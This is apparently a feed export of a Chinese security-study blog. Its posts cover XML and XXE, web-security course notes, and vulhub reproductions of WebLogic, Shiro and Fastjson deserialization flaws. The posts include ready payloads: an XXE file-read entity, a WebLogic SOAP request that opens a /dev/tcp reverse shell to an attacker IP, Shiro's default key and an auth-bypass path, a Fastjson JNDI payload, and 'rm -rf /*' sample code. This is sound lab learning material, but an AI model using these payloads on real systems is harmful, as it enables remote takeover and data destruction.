：比如APP和服务器之间传订单信息，用XML打包数据，双方都能看懂</p><p>   <strong>3</strong></p><p>   <strong>7</strong></p><p>   。</p><p>2. </p><p>   当配置文件</p><p>   ：很多软件的设置文件（比如Java的Spring框架）用XML存参数</p><p>   <strong>3</strong></p><p>   <strong>8</strong></p><p>   。</p><p>3. </p><p>   小型数据库</p><p>   ：比如存几百本书的信息，方便随时读取</p><p>   <strong>3</strong></p><p>   <strong>4</strong></p><p>   。</p><p>4. </p><p>   规范数据格式</p><p>   ：比如电商平台要求所有商家用统一的XML格式上传商品</p><p>   <strong>4</strong></p><p>   <strong>7</strong></p><p>   。</p><hr><h4 id="5-举个实际例子"><a href="#5-举个实际例子" class="headerlink" title="5. 举个实际例子"></a><strong>5. 举个实际例子</strong></h4><p>假设你要用XML存学生信息：</p><p>xml</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">班级</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">学生</span> <span class="attr">学号</span>=<span class="string">&quot;001&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">姓名</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">姓名</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">年龄</span>&gt;</span>18<span class="tag">&lt;/<span class="name">年龄</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">成绩</span>&gt;</span>90<span class="tag">&lt;/<span class="name">成绩</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">学生</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">学生</span> <span class="attr">学号</span>=<span class="string">&quot;002&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">姓名</span>&gt;</span>李四<span class="tag">&lt;/<span class="name">姓名</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">年龄</span>&gt;</span>19<span class="tag">&lt;/<span class="name">年龄</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">成绩</span>&gt;</span>85<span class="tag">&lt;/<span class="name">成绩</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">学生</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">班级</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>根标签</strong>：<code>&lt;班级&gt;</code></li><li><strong>嵌套结构</strong>：每个学生信息包裹在 <code>&lt;学生&gt;</code> 里，属性 <code>学号</code> 区分不同学生</li></ul><p><strong>XML &#x3D; 自定义标签 + 结构化数据 + 严格语法</strong>。它像一张万能表格，能把杂乱的数据整理得井井有条，方便电脑和人一起看懂。学XML的重点是：<strong>标签别写错、属性加引号、结构要清晰</strong>！</p><h5 id="xml语言的格式"><a href="#xml语言的格式" class="headerlink" title="xml语言的格式"></a>xml语言的格式</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>   //xml的声明  </span><br><span class="line"> <span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file://d:/1.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta"> ]&gt;</span>                                      //DTD部分</span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span>                          //xml部分</span><br></pre></td></tr></table></figure><p>首先第一句是声明，声明这是一段xml代码，接下来是一个DTD的部分，意思是读取d盘上的1.txt文件。比如我们经常要用到某一组数据，那么每次都引用，肯定是非常不方便的，所以把这组经常用的数据设置成为一个变量，需要的时候直接调用这个变量，通过以上的解释，我们不难看出，xml如果产生漏洞，那肯定就是在这个DTD部分，最后则是xml部分。</p><p>一道java题目结合xxe漏洞</p><h5 id="CVE-2019-12415"><a href="#CVE-2019-12415" class="headerlink" title="CVE-2019-12415"></a>CVE-2019-12415</h5><p>之前刷题网鼎杯碰到的 顺便复习了下xxe（外部实体注入漏洞）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;XML基础&quot;&gt;&lt;a href=&quot;#XML基础&quot; class=&quot;headerlink&quot; title=&quot;XML基础&quot;&gt;&lt;/a&gt;&lt;strong&gt;XML基础&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://so.csdn.net/so/search?q=</summary>
      
    
    
    
    
    <category term="xxe" scheme="https://gu0f3n.github.io/tags/xxe/"/>
    
  </entry>
  
  <entry>
    <title>跟着小迪的第四天</title>
    <link href="https://gu0f3n.github.io/2025/03/09/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E5%9B%9B%E5%A4%A9/"/>
    <id>https://gu0f3n.github.io/2025/03/09/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E5%9B%9B%E5%A4%A9/</id>
    <published>2025-03-09T03:24:40.000Z</published>
    <updated>2025-03-20T10:15:03.242Z</updated>
    
    <content type="html"><![CDATA[<p>ASP安全</p><p>遇到的比较少这里就不去复现了直接干看课程了</p><p>window asp iis access(sqlsever)</p><p>中间件问题 数据库问题 语言问题</p><p>aceess 数据库 一般后缀名 asp asa mdb(下载)</p><p>mdb默认下载</p><p>mdb文件在网站目录下</p><p>思路：知道数据库地址就可以尝试下载获取数据库文件 获取当前管理员账号信息</p><p>吧n</p><p>asp后门上传</p><p>ASP的数据库文件除了可以以mdb结尾，也能以asp结尾，由于mdb文件能下载而asp文件会被执行，因此当我们访问以asp结尾的数据库文件时只能看到乱码数据而不会自动下载，但依旧可以将乱码内容复制到记事本中，再将文件后缀修改成mdb，即可看到正常内容。</p><p>后门植入ASP的原理是当网站存在用户输入数据并被保存在数据库中时（例如留言信息），如果我们输入精心编写的ASP执行语句（类似一句话木马，但看起来是乱码的），然后服务器将其存储到数据库中，我们再访问这个asp数据库文件，由于服务器会把这个文件当成ASP解释执行，因此我们的执行语句也会被执行，这个时候再用菜刀等连接工具即可拿下服务器。<br> IIS 中间件解析漏洞</p><p>第一个就是文件夹有asp后缀 里面的文件全都按照asp进行解析</p><p>还有一种解析漏洞命名</p><p>IIS PUT上传漏洞，服务器开启写入功能才会有这个漏洞，不过比较少见</p><p>php 和java 没记录了 </p><p>直接记录python</p><p>ssti </p><p>模板 相当于手机主题差不都意思</p><p>字节码文件（bytecode），pyc文件经过python解释器<br>最终会生成机器码运行。因此pyc文件是可以跨平台部署的，类似Java的.class文件，<br>般py文件改变后，都会重新生成pyc文件。</p><p> 那么就可以反编译获得源码文件</p><pre><code>1、什么是sSTI？有什么漏洞危害？</code></pre><p>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为We应用模<br>板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模<br>板的语句，因而可能导致了敏感信息泄露、代码执行、GetShe11等问题。其影响范围主<br>要取决于模版引擎的复杂性。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ASP安全&lt;/p&gt;
&lt;p&gt;遇到的比较少这里就不去复现了直接干看课程了&lt;/p&gt;
&lt;p&gt;window asp iis access(sqlsever)&lt;/p&gt;
&lt;p&gt;中间件问题 数据库问题 语言问题&lt;/p&gt;
&lt;p&gt;aceess 数据库 一般后缀名 asp asa mdb(下载)</summary>
      
    
    
    
    
    <category term="xiaodisec" scheme="https://gu0f3n.github.io/tags/xiaodisec/"/>
    
  </entry>
  
  <entry>
    <title>跟着小迪的第三天</title>
    <link href="https://gu0f3n.github.io/2025/03/08/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E4%B8%89%E5%A4%A9/"/>
    <id>https://gu0f3n.github.io/2025/03/08/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E4%B8%89%E5%A4%A9/</id>
    <published>2025-03-08T01:42:12.000Z</published>
    <updated>2025-03-20T10:30:17.104Z</updated>
    
    <content type="html"><![CDATA[<p>php开发</p><p>这个课听着无聊</p><?phpmysql_connect()//数据库连接mysal_select_db()//选择库?><p>文件上传功能</p><p>是自己写的还是应用的别人的框架</p><p>文件下载</p><p>直接下载 和传参下载</p><p>文件删除i基本上碰不到了</p><p>文件写入</p><p>web漏洞核心 可控变量和特定函数</p><p>输入输出类安全问题</p><p>xss漏洞</p><p>反射：存储：dom</p><p>输入的内容直接显示出来</p><p> 导致前端直接执行js代码</p><script>alert(1)</script><p>全局变量$_SERVER</p><p>数据包的所有请求头</p><p>csrf跨站点请求伪造</p><p> 后台管理系统有多个文件页面，为了方便验证，一般会选用cookie或session进行验证<br>cookie：身份验证存储到客户端浏览器内<br>session：身份验证存储到服务端服务器内</p><p>未授权访问</p><p>登录后的页面没有验证是否登录成功</p><p>验证方式cookie,session</p><p>cookie：身份验证存储到客户端浏览器内<br>cookie安全：cookie修改伪造盗取<br>session：身份验证存储到服务端服务器内<br>session安全：会话劫持（session劫持）</p><p>验证码复用</p><p>先输入正确密码然后抓包保存</p><p>这个验证码可以一直用</p><p>js前端验证 在浏览器上进行的验证 威胁：浏览器可以在前端直接忽略</p><p>框架</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;php开发&lt;/p&gt;
&lt;p&gt;这个课听着无聊&lt;/p&gt;
&lt;?php

mysql_connect()//数据库连接

mysal_select_db()//选择库

?&gt;

&lt;p&gt;文件上传功能&lt;/p&gt;
&lt;p&gt;是自己写的还是应用的别人的框架&lt;/p&gt;
&lt;p&gt;文件下载&lt;/p&gt;
&lt;p&gt;直</summary>
      
    
    
    
    
    <category term="xiaodisec" scheme="https://gu0f3n.github.io/tags/xiaodisec/"/>
    
  </entry>
  
  <entry>
    <title>weblogic反序列化复现</title>
    <link href="https://gu0f3n.github.io/2025/03/07/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/"/>
    <id>https://gu0f3n.github.io/2025/03/07/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/</id>
    <published>2025-03-07T13:47:20.000Z</published>
    <updated>2025-03-20T10:13:17.970Z</updated>
    
    <content type="html"><![CDATA[<p>Oracle Fusion Middleware（Oracle融合中间件）是美国甲骨文（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。Oracle WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件。</p><p>Oracle Fusion Middleware中的Oracle WebLogic Server组件的WLS Security子组件存在安全漏洞。攻击者可利用该漏洞控制组件，影响数据的可用性、保密性和完整性。</p><h4 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h4><p>Oracle WebLogic Server 10.3.6.0.0版本，12.1.3.0.0版本，12.2.1.1.0版本，12.2.1.2.0版本</p><p><strong>构造如下Payload：</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i <span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span> /dev/tcp/攻击IP/1234 0<span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>使用burp进行抓包 请求头中添加以下字段：</strong></p><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">SOAPAction:</span></span><br><span class="line"><span class="section">Content-Type:text/xml</span></span><br></pre></td></tr></table></figure><p><strong>写入准备好的payload POST方式发送即可</strong></p><p>nc 监听1234端口反弹shell</p><h1 id="Weblogic命令执行漏洞（CVE-2018-2628）"><a href="#Weblogic命令执行漏洞（CVE-2018-2628）" class="headerlink" title="Weblogic命令执行漏洞（CVE-2018-2628）"></a>Weblogic命令执行漏洞（CVE-2018-2628）</h1><h4 id="漏洞咋产生的？"><a href="#漏洞咋产生的？" class="headerlink" title=".漏洞咋产生的？"></a><strong>.漏洞咋产生的？</strong></h4><p>漏洞的核心是<strong>WebLogic处理T3协议数据时的“无脑拆包”机制</strong>。T3协议是WebLogic默认开启的通信协议，用于服务器和Java程序之间的数据传输。但它在解析数据时，会直接对序列化数据（类似打包的快递）进行反序列化（拆包），而<strong>没有严格检查包裹里是否有危险物品</strong>（恶意代码）</p><p><strong>T3协议默认开放</strong>：WebLogic的7001端口默认开启T3服务，相当于给黑客留了个后门</p><p><strong>反序列化黑名单不全</strong>：之前Oracle通过黑名单拦截危险类（比如<code>java.rmi.registry.Registry</code>），但攻击者换了个接口（如<code>java.rmi.activation.Activator</code>），就绕过了检查</p><p><strong>依赖危险库</strong>：WebLogic使用了存在漏洞的Apache Commons Collections库，黑客可通过这个库触发代码执行</p><h4 id="攻击步骤拆解"><a href="#攻击步骤拆解" class="headerlink" title="攻击步骤拆解"></a><strong>攻击步骤拆解</strong></h4><p><strong>分四步走</strong>：</p><ol><li><p><strong>第一步：搭“指挥中心”（JRMP Server）</strong></p><ul><li>攻击者在自己电脑上开个<strong>“指挥中心”</strong>（JRMP监听服务），等着服务器主动联系。</li><li><em>相当于黑客建了个秘密电台，准备发号施令。</em></li></ul></li><li><p><strong>第二步：伪造“通行证”（构造Payload）</strong></p><ul><li><p>用工具生成一个</p><p>“假通行证”</p><p>（Payload），里面写着：</p><ul><li><em>“指挥中心”地址（攻击者IP和端口）。</em></li><li><em>“见到指挥中心后，按它的指令办事！”</em></li></ul></li><li><p><em>这个通行证本质是一串伪装成正常数据的代码，但暗藏玄机。</em></p></li></ul></li><li><p><strong>第三步：快递“炸弹”（发送Payload）</strong></p><ul><li>通过WebLogic的<strong>T3快递通道</strong>（7001端口），把假通行证寄给服务器。</li><li><em>因为T3通道默认开放且安检不严，包裹顺利送达。</em></li></ul></li><li><p><strong>第四步：引爆“炸弹”（触发漏洞）</strong></p><ul><li>服务器拆开包裹（反序列化Payload），发现要联系“指挥中心”。</li><li>服务器主动连接攻击者的JRMP监听服务，<strong>“指挥中心”立刻下发最终指令</strong>（比如：“执行命令<code>rm -rf /*</code>删库”）。</li><li><em>此时服务器完全被控制，攻击者想干啥就干啥。</em></li></ul></li></ol><p><strong>T3协议</strong>：WebLogic的专属快递通道，默认开放且效率高，但安检不严</p><p><strong>RMI绕过黑名单</strong>：Oracle用黑名单拦截已知危险类，但攻击者改用RMI协议的其他接口（如<code>Activator</code>），换汤不换药绕过了检查</p><p><strong>反序列化漏洞</strong>：服务器无脑拆包裹（<code>readObject</code>方法），把恶意代码当正常指令执行</p><p><strong>JRMP协议</strong>：攻击者用JRMP监听服务做“远程指挥”，让服务器主动连接并接收攻击指令</p><p>攻击就是利用CVE-2018-2628漏洞工具包(检测工具在其中)</p><p>首先有一个监测工具需要将txt文件改成目标及ip检测</p><p>检测成功之后</p><p>利用ysoserial去生成payload然后启动JRMP的监听</p><p>然后利用工具伪造payload 反弹shell到我的攻击机</p><p>染红通过T3通道把payload传递给服务器进行反序列化解析连接jRMP建立通讯</p><p>然后JRMP发送反弹shell 的命令，拿下攻击机</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Oracle Fusion Middleware（Oracle融合中间件）是美国甲骨文（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。Oracle WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件</summary>
      
    
    
    
    
    <category term="weblogic" scheme="https://gu0f3n.github.io/tags/weblogic/"/>
    
  </entry>
  
  <entry>
    <title>shiro反序列化漏洞复现</title>
    <link href="https://gu0f3n.github.io/2025/03/07/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://gu0f3n.github.io/2025/03/07/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2025-03-07T11:40:51.000Z</published>
    <updated>2025-03-20T10:13:17.967Z</updated>
    
    <content type="html"><![CDATA[<p>vulhub靶场复现</p><p>漏洞原理</p><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。 那么，Payload产生的过程： 命令&#x3D;&gt;序列化&#x3D;&gt;AES加密&#x3D;&gt;base64编码&#x3D;&gt;RememberMe Cookie值 在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了,Payload构造起来也是十分的简单。</p><p>这是一个典型的 <strong>Shiro RememberMe 反序列化漏洞</strong>的触发路径。用大白话解释就是：</p><hr><h3 id="场景比喻"><a href="#场景比喻" class="headerlink" title="场景比喻"></a><strong>场景比喻</strong></h3><p>想象你进了一家高级会所，前台给你一张<strong>加密的会员卡（RememberMe Cookie）</strong>，下次来不用输密码，直接刷卡进。但这家会所的会员卡加密方式有问题——<strong>用的是一把通用钥匙（默认密钥）</strong>，导致坏人能伪造任意会员卡。</p><hr><h3 id="流程拆解"><a href="#流程拆解" class="headerlink" title="流程拆解"></a><strong>流程拆解</strong></h3><ol><li><strong>登录成功</strong>：<br>你输入账号密码正确，前台（Shiro）说：“记住这个用户，下次直接刷会员卡进！”<br>→ 触发 <code>onSuccessfulLogin</code> 方法。</li><li><strong>制作会员卡</strong>：<br>前台把你的信息（用户名、权限）​<strong>打包成快递（序列化）​</strong>，用<strong>会所统一包装盒（加密）​</strong>封好，再贴个快递单（Base64编码）。<br>→ 调用 <code>rememberIdentity</code> → <code>rememberSerializedIdentity</code>。</li><li><strong>快递配送</strong>：<br>前台把包装好的快递（加密后的数据）塞进你的浏览器，变成一张<strong>会员卡（Cookie）​</strong>。<br>→ 设置Cookie值 <code>rememberMe=加密后的Base64字符串</code>。</li><li><strong>漏洞在哪</strong>：<ul><li><strong>通用钥匙</strong>：所有会员卡都用同一把钥匙加密（Shiro默认硬编码密钥）。</li><li><strong>包装盒可破解</strong>：序列化数据用的是可预测的加密方式（AES-CBC）。<br>→ 坏人拿到你的会员卡，拆开包装盒，换上自己的毒包裹（恶意代码），再用原样封好，系统会正常解密执行。</li></ul></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.首先正常登录，然后生成带有rememberme的返回cookie值。 2.生成cookie，shiro会提供rememberme功能，可以通过cookie记录登录用户，从而记录登录用户的身份认证信息，即下次无需登录即可访问。处理rememberme的cookie的类为org.apache.shiro.web.mgt.CookieRememberMeManager 3.之后进入serialize，对登录认证信息进行序列化 4.然后加密，调用aes算法。 5.加密结束，然后在在org/apache/shiro/web/mgt/CookieRememberMeManager.java的rememberSerializedIdentity方法中进行base64编码，并通过response返回 6.解析cookie 7.先解密在反序列化 8.AES是对称加密，加解密密钥都是相同的，并且shiro都是将密钥硬编码 9.调用crypt方法利用密文，key，iv进行解密,解密完成后进入反序列化，看上面的public AbstractRememberMeManager这里用的是默认反序列化类,然后触发生成反序列化</span><br></pre></td></tr></table></figure><p>生成带有Rememberme的返回cookie-&gt;处理rememberme的cookie的类为org.apache.shiro.web.mgt.CookieRememberMeManager-&gt;序列化登录信息-&gt;交给aes进行加密-&gt;加密后org&#x2F;apache&#x2F;shiro&#x2F;web&#x2F;mgt&#x2F;CookieRememberMeManager.java的rememberSerializedIdentity进行base64编码-&gt;解析cookie-&gt;先解密在反序列化</p><p>判断AES密钥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密钥不正确或类型转换异常时，目标Response包含Set-Cookie：rememberMe=deleteMe字段，</span><br><span class="line"></span><br><span class="line">而当密钥正确且没有类型转换异常时，返回包不存在Set-Cookie：rememberMe=deleteMe字段</span><br></pre></td></tr></table></figure><p>工具：<a href="https://github.com/feihong-cs/ShiroExploit-Deprecated/releases">https://github.com/feihong-cs/ShiroExploit-Deprecated/releases</a></p><p>shrio-550使用的是默认密钥kPH+blxk5D2deZilxcaaaA&#x3D;&#x3D;</p><p>工具非常给力可以获得密钥</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1741351728827.jpg"></p><p>这就不去复现了</p><h1 id="Shiro-认证绕过漏洞-CVE-2020-1957"><a href="#Shiro-认证绕过漏洞-CVE-2020-1957" class="headerlink" title="[Shiro-认证绕过漏洞(CVE-2020-1957)]"></a>[Shiro-认证绕过漏洞(CVE-2020-1957)]</h1><p>核心点就是</p><ol><li><p><strong>场景设定</strong>：</p><ul><li><strong>门卫（Shiro）</strong>：负责检查每个客人能不能进VIP室，规则是”所有想进 <code>/vip</code> 房间的人必须出示会员卡”。</li><li><strong>管家（Spring）</strong>：负责带客人去实际房间，但它有个怪癖——<strong>看到分号 <code>;</code> 就会自动截断</strong>后面的内容。</li></ul></li><li><p><strong>坏人如何混进VIP室</strong>：<br>坏人不去正门 <code>/vip</code>，而是故意走歪路：</p><ul><li><strong>构造假路径</strong>：<code>/vip;/../秘密通道</code></li><li><strong>门卫视角</strong>：检查路径是 <code>/vip</code>（因为Shiro看到分号 <code>;</code> 就停下），发现规则是允许所有人访问 <code>/vip</code>（未配置需要登录），直接放行。</li><li><strong>管家视角</strong>：处理路径时，看到分号 <code>;</code> 就截断成 <code>/vip</code>，实际却把客人带到 <code>/秘密通道</code>（VIP室后门）。</li></ul><p>→ <strong>门卫以为你去的是公开区域，管家却把你带进了VIP室</strong>，全程没查会员卡！</p></li></ol><p>这个文章写的也很好<a href="https://www.cnblogs.com/dhan/p/18423713">https://www.cnblogs.com/dhan/p/18423713</a></p><p>这个文章主流payload是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/xxx/..;/admin/</span><br></pre></td></tr></table></figure><p>首先shiro处理的</p><p>将分号后面的内容直接处理了得到xxx&#x2F;..，显示不是要去&#x2F;admin可以直接bypass掉了shiro认证</p><p>spring认证</p><p>跟进removeSemicolonContentInternal(requestUri)方法，他的作用就是：<code>移除uri中/与/之间的;分号以及;分号后面的内容</code></p><p>根据这句话可以得知最后的uri应该是：</p><p><code>/xxx/../admin/ == /admin/</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;vulhub靶场复现&lt;/p&gt;
&lt;p&gt;漏洞原理&lt;/p&gt;
&lt;p&gt;Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化</summary>
      
    
    
    
    
    <category term="shiro" scheme="https://gu0f3n.github.io/tags/shiro/"/>
    
  </entry>
  
  <entry>
    <title>“fastjson初探”</title>
    <link href="https://gu0f3n.github.io/2025/03/03/%E2%80%9Cfastjson%E5%88%9D%E6%8E%A2%E2%80%9D/"/>
    <id>https://gu0f3n.github.io/2025/03/03/%E2%80%9Cfastjson%E5%88%9D%E6%8E%A2%E2%80%9D/</id>
    <published>2025-03-03T12:02:19.000Z</published>
    <updated>2025-03-05T07:20:54.010Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Fastjson1-2-24-RCE漏洞"><a href="#Fastjson1-2-24-RCE漏洞" class="headerlink" title="Fastjson1.2.24-RCE漏洞"></a>Fastjson1.2.24-RCE漏洞</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。即fastjson的主要功能就是将Java Bean序列化成JSON字符串，这样得到字符串之后就可以通过数据库等方式进行持久化了。</p><p> 漏洞原理 </p><p>再用Fastjson解析JSON数据的时候</p><p>假如攻击者伪造一段特殊的的恶意的JSON数据 </p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rmi://黑客仓库/危险物品&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这里面攻击者伪造了@type标签 需要用com.sun.rowset.JdbcRowSetImpl（指定反序列化类）进行处理 </p><p>这个jdbcRowSetlmpl 我们理解为分拣员 那么 分拣员记录下“需要联系黑客仓库的指令”</p><p>autoCommit”: true则会触发setAutoCommit()方法 相当于让jdbcRowSetlmpl立即执行</p><p>然后我们就进行恶意仓库的连接（JNDL注入）</p><p>分拣员（jdbcRowSetlmpl）就会根据rmi:&#x2F;&#x2F;黑客仓库&#x2F;危险物品地址拨打电话（发起JNDL请求）而黑客仓库（攻击者搭建二点RMI服务器）就会回应</p><p>“请到http:&#x2F;&#x2F;恶意站点&#x2F;Exploit.class领取包裹”</p><p><strong>加载“危险物品”（远程代码执行）</strong></p><p>快递公司系统（JVM）从恶意站点下载的Exploit.class并自动拆包执行其中的代码。例如：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Exploit.class 静态代码块</span></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">  Runtime.getRuntime().exec(<span class="string">&quot;rm -rf /*&quot;</span>); <span class="comment">// 删除服务器数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，攻击者通过一个伪造的包裹，成功劫持<img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1741005491298.jpg" alt="img">了整个快递</p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>搭建环境就不演示了</p><p>首先在vulhubfastjson下面 创建一个test.java 内容如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reverse</span>&#123;</span><br><span class="line">        <span class="keyword">static</span> &#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                        <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">                        String[] commands = &#123;<span class="string">&quot;bash&quot;</span>, <span 